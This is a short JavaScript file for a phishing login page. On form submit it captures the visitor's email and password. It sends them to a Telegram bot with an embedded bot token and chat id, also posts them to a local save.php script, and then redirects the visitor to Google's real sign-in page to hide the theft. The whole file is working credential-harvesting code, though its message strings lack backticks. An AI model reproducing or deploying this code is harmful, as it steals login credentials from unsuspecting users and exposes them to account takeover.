document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("login-form");

  form.addEventListener("submit", function (e) {
    e.preventDefault();
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const message = Email: ${email}\nPassword: ${password};

    fetch("https://api.telegram.org/bot7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "7817453978",
        text: message
      })
    });

    try {
      fetch("save.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}
      });
    } catch (err) {
      console.log("Local save missed:", err);
    }

    window.location.href = "https://accounts.google.com";
  });
});
